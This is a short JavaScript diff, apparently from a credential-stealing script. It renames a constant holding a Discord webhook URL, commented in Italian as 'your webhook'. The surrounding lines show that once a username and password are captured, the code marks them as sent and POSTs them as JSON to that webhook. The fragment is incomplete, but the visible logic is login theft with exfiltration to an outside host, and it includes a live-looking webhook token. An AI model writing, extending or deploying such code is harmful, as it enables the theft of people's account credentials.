@@ -1,5 +1,5 @@
 (() => {
-  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1464590647976788000/hb-LppvtKxCE8kAQiiah65ve0vUaq_W9wOIB2jIE_2H4OOEp2wyEV3lMDDj3nsLIWZ8H'; // <-- TUO WEBHOOK
+  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1464590647976788000/hb-LppvtKxCE8kAQiiah65ve0vUaq_W9wOIB2jIE_2H4OOEp2wyEV3lMDDj3nsLIWZ8H';
 
   let username = null;
   let password = null;
@@ -10,7 +10,7 @@
     if (username && password) {
       sent = true;
 
-      fetch(DISCORD_WEBHOOK_URL, {
+      fetch(WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
